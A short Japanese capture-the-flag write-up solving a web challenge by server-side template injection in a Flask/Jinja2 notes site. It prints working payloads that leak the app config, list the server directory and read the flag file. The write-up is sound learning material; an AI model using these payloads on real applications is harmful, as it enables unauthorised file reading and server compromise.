# Notes:Web:881pts
[http://challenges2.hexionteam.com:2001](http://challenges2.hexionteam.com:2001)  

# Solution
URLにアクセスすると次のようなページが開く。  
[site.png](site/site.png)  
どうやら買い物のメモを保存しておくサイトのようで、ソースを見てやると/notesが存在するらしい。  
"{{"を入力してやると/notesで500エラーが発生する。  
サーバーサイドテンプレートインジェクションをにらんで`{{config}}`を入力すると/notesは以下になる。  
[{{config}}を入力]({{config}}.html)  
ここからSECRET_KEYを奪い、セッションを偽装するのかと考えたが違うようだ。  
サーバーのファイルを読み取りにいく。  
`{{url_for.__globals__.__getitem__('os').listdir('./')}}`を入力すると/notesは以下になる。  
```text
["['.bash_logout', '.bashrc', '.profile', '__pycache__', 'server.py', 'templates', 'flag']"]
```
flagなるファイルがあるようだ。  
`{{url_for.__globals__.__getitem__('__builtins__').__getitem__('open')('flag').read()}}`を入力し表示する。  
```text
["hexCTF{d0nt_r3nder_t3mplates_w1th_u5er_1nput} "]
```

## hexCTF{d0nt_r3nder_t3mplates_w1th_u5er_1nput}